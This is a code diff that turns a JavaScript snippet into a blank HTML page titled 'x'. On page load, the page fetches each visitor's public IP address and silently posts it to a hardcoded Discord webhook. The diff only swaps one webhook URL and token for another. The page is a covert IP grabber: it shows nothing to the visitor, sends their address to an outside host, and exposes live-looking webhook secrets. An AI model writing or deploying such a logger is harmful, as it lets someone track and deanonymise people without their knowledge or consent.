@@ -1,8 +1,18 @@
-fetch('https://api64.ipify.org?format=json')
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>x</title>
+</head>
+<body>
+
+<script>
+  fetch('https://api64.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
         const ipAddress = data.ip;
-        const webhookURL = 'https://discord.com/api/webhooks/1197305813530841088/k0OWavGsfYq-kjkY8l77BPXGWX__1X_VKcMs52ootmKOH7gt7WC81zLZ6eiCsisbVWS6';
+        const webhookURL = 'https://discord.com/api/webhooks/1197303153826218055/bUyjZhkxnSthZWF-UpyQJb4_wIF_NJZoM2Gn_5etKV9rwx-hfztGVXeLJDtyfEczvMSn';
 
         // Create payload for Discord webhook
         const payload = {
@@ -21,3 +31,7 @@ fetch('https://api64.ipify.org?format=json')
     .catch(error => {
         console.error('Error:', error);
     });
+</script>
+
+</body>
+</html>
